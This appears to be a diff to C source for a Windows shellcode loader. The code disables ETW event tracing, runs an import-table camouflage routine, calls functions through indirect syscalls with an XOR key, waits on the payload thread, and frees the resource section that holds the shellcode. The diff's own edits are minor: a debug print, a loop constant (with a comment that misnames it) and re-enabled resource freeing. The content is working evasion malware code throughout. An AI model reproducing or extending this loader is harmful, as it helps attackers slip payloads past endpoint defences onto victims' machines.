@@ -50,6 +50,7 @@ int _TIGER(HANDLE hMutant, PVOID Handler);
 // Global Variable
 NTAPI_FUNC _G_NTFUNC = { 0 };
 
+// RCX execution
 LPVOID RtlCallFunction(LPVOID lpparam) {
 	(*(LPVOID(WINAPI*)())(lpparam))();
 	return 0;
@@ -57,7 +58,6 @@ LPVOID RtlCallFunction(LPVOID lpparam) {
 
 //int APIENTRY WinMain(HINSTANCE hInst, HINSTANCE hInstPrev, PSTR cmdline, int cmdshow){
 int main(void) {
-
 	if (DisableETW(ETWEVENTWRITE_HASH) == FALSE || DisableETW(ETWEVENTWRITEFULL_HASH) == FALSE) {
 		return -1;
 	}
@@ -86,7 +86,8 @@ int main(void) {
 	}
 
 	// Increase the number for longer operation
-	for (int i = 0; i < 4; i++) {
+	// defined MPL0 in typedef.h
+	for (int i = 0; i < MLP0; i++) {
 		camoflage_IAT();
 	}
 
@@ -216,13 +217,15 @@ int _TIGER(HANDLE hMutant, PVOID Handler) {
 	HANDLE		hProcess = NtCurrentProcess(),	// local process
 				hThread = NULL;
 
+	PRINTA("Resource ADDR: %#p\n", res);
+
 	const char key[] = { 'X','@','f','8','k','d','3','T','D','o','!','r','j','E' };
 	SIZE_T sizeKey = sizeof(key);
 
 	// initializing the used syscalls
 	if (!InitializeNtSyscalls()) {
 #ifdef DEBUG
-		PRINTA("[!] Failed To Initialize The Specified Indirect-Syscalls \n");
+		PRINTA("[!] Failed To Initialize The Specified Indirect Syscalls \n");
 #endif
 		return -1;
 	}
@@ -287,7 +290,6 @@ int _TIGER(HANDLE hMutant, PVOID Handler) {
 		return -1;
 	}
 
-
 	// waiting for the payload
 	SET_SYSCALL(_G_NTFUNC.NtWaitForSingleObject);
 	if ((STATUS = RunSyscall(hThread, FALSE, NULL)) != 0x00) {
@@ -299,7 +301,7 @@ int _TIGER(HANDLE hMutant, PVOID Handler) {
 
 	// Free the .rsrc section with the shellcode
 	RtlSecureZeroMemory(payload, sSize);
-	//FreeResource(res);
+	FreeResource(res);
 
 	BOOL MutantRes = _DestroyMutant(hMutant);
 	if (MutantRes != TRUE) {
